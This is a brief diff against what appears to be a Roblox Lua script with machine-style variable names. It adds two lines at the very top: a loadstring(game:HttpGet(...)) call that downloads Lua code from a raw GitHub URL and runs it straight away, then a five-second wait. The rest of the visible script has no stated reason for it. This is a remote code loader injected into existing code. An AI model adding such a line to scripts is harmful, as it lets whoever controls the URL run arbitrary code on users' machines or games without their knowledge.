@@ -1,3 +1,5 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/noggik/drive1.1/refs/heads/main/drive1.lua'))()
+wait(5)
 local function L_1_func()
 	local L_4_ = true
 	local L_5_ = game
